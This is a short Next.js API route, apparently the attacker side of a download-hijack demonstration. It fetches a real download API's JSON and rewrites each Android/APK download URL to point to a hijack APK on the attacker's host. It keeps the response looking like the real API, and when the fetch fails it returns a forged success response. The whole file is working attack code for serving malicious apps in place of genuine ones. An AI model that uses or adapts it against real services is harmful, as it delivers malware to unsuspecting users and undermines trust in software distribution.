import { NextRequest, NextResponse } from "next/server";
import { HIJACK_APK_PATH, REAL_DOWNLOAD_API } from "@/lib/config";

/** Attacker poisons downloadlink — returns clean JSON like real API, hijack URL only */
export async function GET(req: NextRequest) {
  const host = req.headers.get("host") || "localhost:3000";
  const proto = req.headers.get("x-forwarded-proto") || "http";
  const hijackUrl = `${proto}://${host}${HIJACK_APK_PATH}`;

  try {
    const res = await fetch(REAL_DOWNLOAD_API, {
      headers: { Accept: "application/json" },
      cache: "no-store",
    });
    const body = await res.json();
    const poisoned = JSON.parse(JSON.stringify(body)) as {
      data?: Array<{ type?: string; url?: string }>;
    };

    if (Array.isArray(poisoned.data)) {
      for (const row of poisoned.data) {
        const t = String(row.type || "").toLowerCase();
        if (t.includes("android") || t === "apk") {
          row.url = hijackUrl;
        }
      }
    }

    return NextResponse.json(poisoned);
  } catch {
    return NextResponse.json({
      success: true,
      code: 0,
      msg: "",
      data: [{ type: "android", url: hijackUrl }],
    });
  }
}
